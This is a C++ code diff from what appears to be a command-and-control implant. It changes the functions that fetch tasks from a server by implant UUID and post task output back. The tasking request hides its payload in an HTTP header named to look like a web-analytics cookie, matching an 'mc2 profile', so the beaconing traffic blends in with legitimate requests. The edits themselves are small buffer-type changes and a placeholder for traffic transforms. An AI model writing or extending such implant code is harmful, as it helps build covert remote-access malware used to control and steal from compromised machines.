@@ -9,7 +9,10 @@
 nlohmann::json get(std::string implant_uuid) {
     //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 
 
-    std::vector<uint8_t> http_response_buffer;
+    //std::vector<uint8_t> http_response_buffer;
+
+    std::string http_response_buffer;
+
 
     //[TEMPLATE ME] //temp use of headers, matching test mc2 profile. 
     // Define headers (No \r\n needed)
@@ -36,11 +39,18 @@ nlohmann::json get(std::string implant_uuid) {
     L"utmcc: " + std::wstring(payload.begin(), payload.end())
     };
 
+
+
     if (HTTP_GET(headers, http_response_buffer)) {
         // Check if buffer is empty before decoding
         if (http_response_buffer.empty()) {
             return nullptr;
         }
+
+        /*
+        Transforms....
+        */
+
         std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
         nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
         return task_data;
@@ -88,7 +98,7 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
     std::string payload_string = "";
 
     //send
-    std::vector<uint8_t> http_post_response_buffer;
+    std::string http_post_response_buffer;
     if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
         std::cout << "Error occured posting data";
     };
